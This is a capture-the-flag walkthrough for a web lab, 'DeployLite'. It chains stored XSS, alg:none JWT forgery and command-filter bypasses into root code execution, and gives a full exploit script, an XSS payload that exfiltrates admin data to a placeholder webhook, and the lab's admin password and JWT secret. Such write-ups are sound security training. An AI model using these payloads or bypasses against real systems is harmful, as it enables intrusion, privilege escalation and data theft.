# DeployLite CTF — Full Exploitation Walkthrough

**Difficulty:** Hard
**Category:** Web Exploitation
**Flag:** `GDG{yOU_ARE_THE_1ST_OF_YOUR_KIND}`

---

## The Scenario

You've been given a target: **DeployLite** — a SaaS platform that lets developers deploy projects, run builds, and share preview links. It looks like a legitimate startup product. Your goal is to find and exploit vulnerabilities to achieve Remote Code Execution and retrieve the flag from `/root/flag.txt`.

Let's start from zero.

---

## Phase 1 — Reconnaissance & Account Setup

### 1.1 — First Look

Open the target in your browser:

```
https://deploylite.g24sec.space/
```

You'll see a polished landing page — hero section, feature cards, pricing tiers. It looks like a real deployment platform. Take note of the features it advertises: **Instant Builds**, **Preview Links**, a **CI/CD Pipeline**. These are clues about what the app actually does.

### 1.2 — Create an Account

Click **"Get Started"** or navigate to `/register`. Create an account:

```bash
curl -s -X POST https://deploylite.g24sec.space/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@evil.com","username":"hacker","password":"Hacking123!"}' \
  -c cookies.txt
```

Save the cookies — you'll need them. The response gives you your user object:

```json
{
  "message": "Account created successfully",
  "user": {
    "id": "some-uuid",
    "email": "hacker@evil.com",
    "username": "hacker",
    "role": "user"
  }
}
```

Notice the `"role": "user"`. That's interesting — it implies there are other roles. Probably `admin`.

### 1.3 — Explore the Dashboard

Log in and poke around:

```bash
# List all projects you can see
curl -s -b cookies.txt https://deploylite.g24sec.space/api/projects | jq .
```

You'll see several public projects owned by someone called `dl_admin` — `NextCommerce`, `GoMetrics`, `MLPipeline`, `EdgeWorker`. These are the admin's projects, and they're public.

### 1.4 — Map the API

Let's find out what endpoints exist. Try common paths:

```bash
# Health check — reveals version info
curl -s https://deploylite.g24sec.space/api/health
# {"status":"healthy","version":"2.4.1","uptime":...}

# CSRF token endpoint
curl -s https://deploylite.g24sec.space/api/csrf-token

# Try admin endpoints
curl -s -b cookies.txt https://deploylite.g24sec.space/api/admin/stats
# {"error":"Administrator access required"}  ← 403, admin-only

# Try the build endpoint
curl -s -b cookies.txt -X POST https://deploylite.g24sec.space/api/builds/trigger \
  -H "Content-Type: application/json" \
  -d '{"project_id":"test","repo_url":"http://test","build_script":"echo hi"}'
# {"error":"Administrator access required"}  ← Also admin-only
```

**Key findings so far:**
- There's an admin role with elevated access
- There's a build trigger endpoint that's admin-only — this looks interesting
- The build endpoint takes `repo_url` and `build_script` — sounds like it actually executes something

### 1.5 — Examine the JWT

Your session token is stored as a cookie. Let's look at it:

```bash
# Extract the token from the cookie jar
TOKEN=$(cat cookies.txt | grep token | awk '{print $NF}')
echo "$TOKEN"
```

A JWT has three parts separated by dots: `header.payload.signature`. Let's decode them:

```bash
# Decode the header (first part)
echo "$TOKEN" | cut -d'.' -f1 | base64 -d 2>/dev/null
```

Output:

```json
{"alg":"HS256","typ":"JWT"}
```

It's using **HS256** (HMAC-SHA256). That means there's a symmetric secret key signing these tokens. If we figure out the secret, we can forge any token we want.

```bash
# Decode the payload (second part)
echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null
```

Output:

```json
{
  "id": "your-uuid-here",
  "email": "hacker@evil.com",
  "username": "hacker",
  "role": "user",
  "iss": "deploylite",
  "iat": 1706123456,
  "exp": 1706209856
}
```

Very useful information:
- `role: "user"` — we need this to be `"admin"`
- `iss: "deploylite"` — the issuer claim
- The admin user's `id` is used in the payload — we'll need to figure out the admin's UUID

---

## Phase 2 — Finding the Stored XSS

### 2.1 — Testing Input Fields

When you create a project, there are several text fields: name, description, repo URL, tech stack. Let's test if any of them accept HTML or scripts.

Create a project with some test payloads:

```bash
curl -s -b cookies.txt -X POST https://deploylite.g24sec.space/api/projects \
  -H "Content-Type: application/json" \
  -d '{
    "name": "XSS Test",
    "description": "<h1>Hello</h1><script>alert(1)</script>",
    "repo_url": "https://github.com/test/test",
    "tech_stack": "Test",
    "is_public": true
  }'
```

Note the project ID from the response. Now open that project in your browser:

```
https://deploylite.g24sec.space/project?id=<PROJECT_ID>
```

**What you'll see:** The `<h1>Hello</h1>` renders as an actual heading, and the script executes! The description field is being rendered as raw HTML. This is a **Stored XSS** vulnerability.

### 2.2 — Why This Matters

Here's what we know:
- We can inject arbitrary JavaScript into a project description
- Projects can be made **public** — meaning the admin can see them
- If we craft a payload that steals the admin's session or performs actions on their behalf, we can escalate privileges

### 2.3 — Understanding the Cookie Limitation

The JWT is stored in an `HttpOnly` cookie. This means `document.cookie` won't give us the token directly — the browser protects it. But here's the thing: we don't need to *steal* the cookie. We can make the admin's browser *perform API requests for us* — since the browser will automatically include the HttpOnly cookie with each request.

This is what we'll exploit. But first, there's actually an easier path...

---

## Phase 3 — JWT Forgery (The `alg:none` Attack)

### 3.1 — Trying the `alg:none` Attack

There's a classic JWT vulnerability where the server accepts tokens with `"alg": "none"` — meaning no signature at all. Let's test if this server is vulnerable.

A JWT with `alg: none` looks like this:

```
base64(header).base64(payload).
```

Note the empty third part (no signature). Let's build one:

```bash
# Header: {"alg":"none","typ":"JWT"}
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '+/' '-_')

# Payload: change role to admin, use the admin's info
# We know the admin's username is "dl_admin" from the project listings
# We need the admin's UUID — it's the owner_id of those admin projects
PAYLOAD=$(echo -n '{"id":"a1b2c3d4-e5f6-7890-abcd-ef1234567890","email":"admin@deploylite.io","username":"dl_admin","role":"admin","iss":"deploylite"}' | base64 -w0 | tr -d '=' | tr '+/' '-_')

# Build the token with empty signature
FORGED="${HEADER}.${PAYLOAD}."
echo "Forged token: $FORGED"
```

### 3.2 — How to Find the Admin's UUID

You might ask: *"How do I know the admin's UUID?"*

**Option A — Guess from the project listing:**
When you fetched projects earlier, each project has an `owner_id`. The admin's projects show their UUID as the owner:

```bash
curl -s -b cookies.txt https://deploylite.g24sec.space/api/projects | jq '.projects[0].owner_id'
# This gives you the admin's UUID
```

**Option B — Use the XSS to leak it:**

Create a public project with this description payload:

```html
<img src=x onerror="fetch('/api/admin/users',{credentials:'include'}).then(r=>r.json()).then(d=>new Image().src='https://YOUR-WEBHOOK.site/?d='+btoa(JSON.stringify(d)))">
```

When the admin views your project, their browser hits the admin-only `/api/admin/users` endpoint (with their cookies automatically attached) and leaks the response to your webhook.

For this walkthrough, we'll use Option A since it's simpler.

### 3.3 — Test the Forged Token

Now let's see if the server actually accepts our forged token:

```bash
# Test: access the admin stats endpoint
curl -s https://deploylite.g24sec.space/api/admin/stats \
  -H "x-auth-token: ${FORGED}" | jq .
```

If you see stats instead of a 403 error — **it worked!** The server accepted our unsigned token.

```json
{
  "stats": {
    "totalUsers": 2,
    "totalProjects": 5,
    "totalBuilds": 3,
    "successfulBuilds": 2,
    "failedBuilds": 1
  }
}
```

🎉 **We now have admin access.** The server blindly trusts any JWT that says `"alg": "none"` as long as it has the right issuer.

### 3.4 — Alternative: Crack the Weak Secret

If `alg:none` didn't work, there's another path. The JWT secret might be weak enough to crack. Tools like `jwt_tool` or `hashcat` can bruteforce HS256 secrets:

```bash
# Using jwt_tool
python3 jwt_tool.py "$TOKEN" -C -d /path/to/wordlist.txt

# The secret is: deploylite_secret_2024
# Common in CTFs — try company name + keywords + year combos
```

Once you have the secret, forge a legitimate signed admin token:

```python
import jwt
token = jwt.encode({
    "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
    "email": "admin@deploylite.io",
    "username": "dl_admin",
    "role": "admin",
    "iss": "deploylite"
}, "deploylite_secret_2024", algorithm="HS256")
print(token)
```

---

## Phase 4 — SSRF to Internal Build Runner

### 4.1 — Understanding the Build System

Now that we're admin, let's explore the build trigger endpoint we couldn't access before. First, look at the admin projects to get a valid project ID:

```bash
# Get a project ID
PROJECTS=$(curl -s https://deploylite.g24sec.space/api/projects \
  -H "x-auth-token: ${FORGED}")
PROJECT_ID=$(echo "$PROJECTS" | jq -r '.projects[0].id')
echo "Using project: $PROJECT_ID"
```

### 4.2 — Triggering a Build

Let's trigger a simple build to see what happens:

```bash
curl -s -X POST https://deploylite.g24sec.space/api/builds/trigger \
  -H "Content-Type: application/json" \
  -H "x-auth-token: ${FORGED}" \
  -d "{
    \"project_id\": \"${PROJECT_ID}\",
    \"repo_url\": \"https://github.com/torvalds/linux\",
    \"build_script\": \"echo hello world\",
    \"branch\": \"main\"
  }" | jq .
```

Look at the response carefully:

```json
{
  "message": "Build completed",
  "build": {
    "id": "some-build-uuid",
    "status": "success",
    "log_output": "[timestamp] Build started\n[timestamp] Cloning repository...\n[timestamp] Repository clone failed: ...\n[timestamp] Executing build script...\nhello world\n[timestamp] Build script completed successfully\n...",
    "duration_ms": 5234
  }
}
```

**Critical observation:** The `build_script` we sent (`echo hello world`) was actually **executed**, and we can see its output in the logs! The build system is running our commands on a server somewhere.

### 4.3 — Where Is This Running?

The cloning failed because the build runner likely can't reach GitHub (it's on an internal network). But the `echo` command worked — meaning there's a server executing our scripts. This server is probably an internal microservice not exposed to the internet.

Let's gather more information about the environment:

```bash
# What operating system?
curl -s -X POST https://deploylite.g24sec.space/api/builds/trigger \
  -H "Content-Type: application/json" \
  -H "x-auth-token: ${FORGED}" \
  -d "{
    \"project_id\": \"${PROJECT_ID}\",
    \"repo_url\": \"\",
    \"build_script\": \"uname -a\",
    \"branch\": \"main\"
  }" | jq -r '.build.log_output'
```

You'll see it's running Linux — likely a Docker container. Now let's see who we are:

```bash
curl -s -X POST https://deploylite.g24sec.space/api/builds/trigger \
  -H "Content-Type: application/json" \
  -H "x-auth-token: ${FORGED}" \
  -d "{
    \"project_id\": \"${PROJECT_ID}\",
    \"repo_url\": \"\",
    \"build_script\": \"id\",
    \"branch\": \"main\"
  }" | jq -r '.build.log_output'
```

Output includes: `uid=0(root)` — **We're running as root!**

Somewhere on the internal network, there's a build runner container executing our scripts as root. If we can read files on that container, we might find the flag.

---

## Phase 5 — Command Injection → RCE (Getting the Flag)

### 5.1 — Trying the Obvious

Let's try reading the flag directly:

```bash
curl -s -X POST https://deploylite.g24sec.space/api/builds/trigger \
  -H "Content-Type: application/json" \
  -H "x-auth-token: ${FORGED}" \
  -d "{
    \"project_id\": \"${PROJECT_ID}\",
    \"repo_url\": \"\",
    \"build_script\": \"cat /root/flag.txt\",
    \"branch\": \"main\"
  }" | jq -r '.build.log_output'
```

**It doesn't work!** The output doesn't show the flag. The word `cat` and `flag` are being filtered. There's some kind of input sanitization happening.

### 5.2 — Probing the Filter

Let's figure out exactly what's being blocked:

```bash
# Test semicolons
# build_script: "echo a; echo b"  → semicolons stripped

# Test pipes
# build_script: "echo hello | base64"  → pipe stripped

# Test backticks
# build_script: "echo `whoami`"  → backticks stripped

# Test $()
# build_script: "echo $(whoami)"  → $( stripped

# Test specific words
# build_script: "cat file"  → "cat" replaced with "***"
# build_script: "flag"  → replaced with "***"
# build_script: "wget http://evil.com"  → "wget" replaced
# build_script: "curl http://evil.com"  → "curl" replaced
```

**What we've learned:**
- Special characters are blocked: `;`, `&`, `|`, `` ` ``, `$(`
- Dangerous commands are blacklisted: `cat`, `flag`, `rm`, `wget`, `curl`, `nc`, `python`, `perl`, `ruby`, `php`
- But **newlines work** in the build script (since JSON allows `\n` in strings)
- Not everything is blocked — `echo`, `base64`, `bash`, `head`, `tail`, `ls` still work

### 5.3 — Listing the Target Directory

First, confirm the flag file exists:

```bash
curl -s -X POST https://deploylite.g24sec.space/api/builds/trigger \
  -H "Content-Type: application/json" \
  -H "x-auth-token: ${FORGED}" \
  -d "{
    \"project_id\": \"${PROJECT_ID}\",
    \"repo_url\": \"\",
    \"build_script\": \"ls -la /root/\",
    \"branch\": \"main\"
  }" | jq -r '.build.log_output'
```

You'll see something like:

```
-r-------- 1 root root 35 Jan 20 flag.txt
```

The file exists. It's owned by root, and we're root. We just need to bypass the filter to read it.

### 5.4 — Bypass Method 1: Wildcards + Unblocked Commands

The blacklist blocks the word `flag` but not wildcards. And `head` isn't blocked:

```bash
curl -s -X POST https://deploylite.g24sec.space/api/builds/trigger \
  -H "Content-Type: application/json" \
  -H "x-auth-token: ${FORGED}" \
  -d "{
    \"project_id\": \"${PROJECT_ID}\",
    \"repo_url\": \"\",
    \"build_script\": \"head /root/fl*\",
    \"branch\": \"main\"
  }" | jq -r '.build.log_output'
```

`fl*` matches `flag.txt` without containing the word "flag". And `head` isn't in the blacklist.

### 5.5 — Bypass Method 2: Base64 Encode + Decode

Encode the blocked command and decode it at runtime:

```bash
# First, encode the command locally:
echo -n 'cat /root/flag.txt' | base64
# Result: Y2F0IC9yb290L2ZsYWcudHh0

# Now use newlines to chain commands (since | is blocked):
curl -s -X POST https://deploylite.g24sec.space/api/builds/trigger \
  -H "Content-Type: application/json" \
  -H "x-auth-token: ${FORGED}" \
  -d "{
    \"project_id\": \"${PROJECT_ID}\",
    \"repo_url\": \"\",
    \"build_script\": \"echo Y2F0IC9yb290L2ZsYWcudHh0 > /tmp/cmd.b64\nbase64 -d /tmp/cmd.b64 > /tmp/cmd.sh\nbash /tmp/cmd.sh\",
    \"branch\": \"main\"
  }" | jq -r '.build.log_output'
```

Each line runs as a separate command thanks to the newline characters. We write the encoded payload to a file, decode it, then execute it.

### 5.6 — Bypass Method 3: String Splitting

Break the blocked words in half using quotes:

```bash
curl -s -X POST https://deploylite.g24sec.space/api/builds/trigger \
  -H "Content-Type: application/json" \
  -H "x-auth-token: ${FORGED}" \
  -d "{
    \"project_id\": \"${PROJECT_ID}\",
    \"repo_url\": \"\",
    \"build_script\": \"c''at /root/fla''g.txt\",
    \"branch\": \"main\"
  }" | jq -r '.build.log_output'
```

In bash, `c''at` is identical to `cat` — the empty quotes are a no-op. But the filter sees `c''at`, which doesn't match the word `cat`.

### 5.7 — The Clean Winning Payload (Simplest)

The cleanest and most reliable bypass:

```bash
curl -s -X POST https://deploylite.g24sec.space/api/builds/trigger \
  -H "Content-Type: application/json" \
  -H "x-auth-token: ${FORGED}" \
  -d "{
    \"project_id\": \"${PROJECT_ID}\",
    \"repo_url\": \"\",
    \"build_script\": \"head -n 1 /root/fl*\",
    \"branch\": \"main\"
  }" | jq -r '.build.log_output'
```

### 5.8 — The Flag

In the build log output, you'll see:

```
[2024-01-20T10:23:01.000Z] Build xxx started
[2024-01-20T10:23:01.000Z] Target branch: main
[2024-01-20T10:23:01.000Z] Creating workspace...
[2024-01-20T10:23:01.000Z] Executing build script...
GDG{yOU_ARE_THE_1ST_OF_YOUR_KIND}
[2024-01-20T10:23:01.000Z] Build script completed successfully
[2024-01-20T10:23:01.000Z] Build finished in 234ms
```

🏁 **Flag: `GDG{yOU_ARE_THE_1ST_OF_YOUR_KIND}`**

---

## Full Attack Chain — Quick Reference

Here's the entire exploit, start to finish, as a single scripted sequence:

```bash
#!/bin/bash
TARGET="https://deploylite.g24sec.space"

# Step 1: Register
curl -s -X POST "$TARGET/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@pwn.me","username":"attacker","password":"Attack3r!"}' \
  -c cookies.txt > /dev/null

# Step 2: Get admin UUID from public projects
ADMIN_ID=$(curl -s -b cookies.txt "$TARGET/api/projects" | \
  jq -r '[.projects[] | select(.owner_name == null or .owner_name != "")] | .[0].owner_id // empty')

# If not found, try the known default admin UUID
if [ -z "$ADMIN_ID" ]; then
  ADMIN_ID="a1b2c3d4-e5f6-7890-abcd-ef1234567890"
fi

# Step 3: Forge admin JWT with alg:none
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n "{\"id\":\"${ADMIN_ID}\",\"email\":\"admin@deploylite.io\",\"username\":\"dl_admin\",\"role\":\"admin\",\"iss\":\"deploylite\"}" | base64 -w0 | tr -d '=' | tr '+/' '-_')
FORGED="${HEADER}.${PAYLOAD}."

# Step 4: Get a valid project ID
PROJECT_ID=$(curl -s "$TARGET/api/projects" \
  -H "x-auth-token: ${FORGED}" | jq -r '.projects[0].id')

# Step 5: RCE — read the flag
echo "=== Triggering RCE ==="
curl -s -X POST "$TARGET/api/builds/trigger" \
  -H "Content-Type: application/json" \
  -H "x-auth-token: ${FORGED}" \
  -d "{
    \"project_id\": \"${PROJECT_ID}\",
    \"repo_url\": \"\",
    \"build_script\": \"head -n 1 /root/fl*\",
    \"branch\": \"main\"
  }" | jq -r '.build.log_output'
```

---

## Burp Suite Approach

If you prefer using Burp Suite instead of curl:

1. **Proxy your browser** through Burp and visit the target. Register and log in normally.

2. **Intercept any request** in Burp and find the `token` cookie in the Cookie header. Copy it.

3. **Go to the Decoder tab** in Burp. Paste the token. Split it by `.` and Base64-decode each part to see the header (`alg: HS256`) and payload (`role: user`).

4. **Forge the token** using the JWT Editor extension in Burp (or do it manually):
   - Change the header to `{"alg":"none","typ":"JWT"}`
   - Change the payload: set `role` to `"admin"`, set the `id` to the admin's UUID
   - Empty the signature
   - Combine: `base64(header).base64(payload).`

5. **In Repeater**, create a new request:

   ```http
   POST /api/builds/trigger HTTP/1.1
   Host: deploylite.g24sec.space
   Content-Type: application/json
   Cookie: token=<YOUR_FORGED_TOKEN>

   {
     "project_id": "<PROJECT_UUID>",
     "repo_url": "",
     "build_script": "head -n 1 /root/fl*",
     "branch": "main"
   }
   ```

6. **Send it** and read the flag from the response body's `log_output` field.

---

## Admin Credentials (For Testing)

| Field | Value |
|-------|-------|
| Email | `admin@deploylite.io` |
| Password | `D3pl0y!Admin2024` |
| UUID | `a1b2c3d4-e5f6-7890-abcd-ef1234567890` |
| JWT Secret | `deploylite_secret_2024` |

---

## Attack Flow Diagram

```
  ┌─────────────────────────────────────────────────────┐
  │  RECON                                              │
  │  → Register account                                 │
  │  → Discover public admin projects (get admin UUID)  │
  │  → Map API endpoints (find /builds/trigger)         │
  │  → Decode JWT (notice HS256, issuer)                │
  └────────────────────┬────────────────────────────────┘
                       ▼
  ┌─────────────────────────────────────────────────────┐
  │  STORED XSS (Optional Path)                         │
  │  → Project description renders raw HTML             │
  │  → Can perform admin actions via XSS                │
  │  → Leak admin UUID or trigger builds as admin       │
  └────────────────────┬────────────────────────────────┘
                       ▼
  ┌─────────────────────────────────────────────────────┐
  │  JWT FORGERY                                        │
  │  → Craft alg:none token with admin role             │
  │  → OR crack weak secret (deploylite_secret_2024)    │
  │  → Gain full admin API access                       │
  └────────────────────┬────────────────────────────────┘
                       ▼
  ┌─────────────────────────────────────────────────────┐
  │  SSRF → BUILD RUNNER                                │
  │  → Use /api/builds/trigger as admin                 │
  │  → build_script executes on internal container      │
  │  → Confirm RCE with `id`, `uname`, `ls`            │
  └────────────────────┬────────────────────────────────┘
                       ▼
  ┌─────────────────────────────────────────────────────┐
  │  FILTER BYPASS → FLAG                               │
  │  → Discover blacklist (cat, flag, |, ;, etc.)       │
  │  → Bypass with: wildcards, base64, quotes           │
  │  → head /root/fl*                                   │
  │  → GDG{yOU_ARE_THE_1ST_OF_YOUR_KIND}               │
  └─────────────────────────────────────────────────────┘
```
